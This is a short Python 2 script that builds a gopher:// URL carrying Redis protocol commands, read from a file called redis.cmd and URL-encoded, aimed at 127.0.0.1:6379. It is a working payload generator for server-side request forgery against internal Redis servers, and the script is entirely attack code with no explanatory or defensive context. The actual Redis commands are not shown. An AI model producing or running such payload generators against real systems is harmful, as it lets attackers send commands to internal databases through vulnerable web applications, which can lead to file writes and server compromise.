import urllib

HOST = "127.0.0.1"
PORT = "6379"

def ord2hex(string):
    return '%'+'%02x' % (ord(string))
    
exp = "gopher://%s:%s/_" % (HOST, PORT)

for line in open("redis.cmd", "r"):
    word = ""
    str_flag = False
    redis_resps = []
    for char in line:
        if str_flag == True:
            if char == '"' or char == "'":
                str_flag = False
                if word != "":
                    redis_resps.append(word)
                word = ""
            else:
                word += char
        elif word == "" and (char == '"' or char == "'"):
            str_flag = True
        else:
            if char == " ":
                if word != "":
                    redis_resps.append(word)
                word = ""
            elif char == "\n":
                if word != "":
                    redis_resps.append(word)
                word = ""
            else:
                word += char
    #print redis_resps
    tmp_line = '*' + str(len(redis_resps)) + '\r\n'
    for word in redis_resps:
        tmp_line += '$' + str(len(word)) + '\r\n' + word + '\r\n'
    exp += "".join([ord2hex(i) for i in tmp_line])

print exp
